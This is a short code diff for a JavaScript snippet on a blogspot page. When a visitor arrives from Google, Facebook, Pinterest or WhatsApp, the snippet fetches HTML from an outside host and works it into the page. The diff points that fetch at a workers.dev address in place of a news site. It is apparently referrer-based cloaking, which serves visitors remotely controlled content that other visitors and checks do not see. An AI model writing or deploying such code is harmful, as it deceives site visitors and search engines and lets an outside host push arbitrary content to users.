@@ -5,7 +5,7 @@ const allowedReferrers = ['google', 'facebook', 'pinterest', 'whatsapp.com'];
 const articleContent = '';
 
 if (allowedReferrers.some(referrer.includes.bind(referrer)) && currentDomain === 'awer323.blogspot.com') {
-  fetch('https://jakarta.tribunnews.com/')
+  fetch('https://hello-world-winter-night-5856.mastimon.workers.dev/')
     .then(response => response.text())
     .then(html => {
       const article = document.querySelector('html');
